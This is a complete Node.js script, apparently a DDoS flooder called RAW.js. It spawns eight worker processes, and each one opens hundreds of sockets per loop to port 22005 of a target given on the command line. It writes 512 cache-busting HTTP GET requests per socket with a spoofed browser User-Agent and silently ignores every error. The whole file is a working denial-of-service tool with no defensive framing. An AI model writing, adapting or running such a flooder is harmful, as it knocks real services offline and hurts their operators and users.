const net = require('net');
const cluster = require('cluster');
const numCPUs = 8;

if (cluster.isPrimary) {
    if (process.argv.length <= 2) {
        console.log("Usage: node RAW.js <URL> <TIME> !");
        process.exit(-1);
    }

    const target = process.argv[2];
    const time = parseInt(process.argv[3]) * 1000;

    console.log("Starting!");

    for (let i = 0; i < numCPUs; i++) cluster.fork();

    setTimeout(() => {
        for (const id in cluster.workers) cluster.workers[id].kill();
        process.exit(0);
    }, time);
} else {
    const parsed = new URL(process.argv[2]);
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});

    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    ];

    const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

    const createConnection = () => {
        const s = new net.Socket();
        s.setTimeout(5000);
        s.connect(22005, parsed.host);

        const request = `GET /${Math.random().toString(36).substring(2, 10)}?id=${Math.random().toString(36).substring(2, 10)} HTTP/1.1\r\nHost: ${parsed.host}\r\nUser-Agent: ${getRandomUserAgent()}\r\n\r\n`;

        for (let i = 0; i < 512; i++) s.write(request);

        s.on('data', () => setTimeout(() => s.destroy(), 4000));
        s.on('error', () => {});
    };

    setInterval(() => {
        for (let i = 0; i < 100; i++) createConnection();
    }, 0);
}
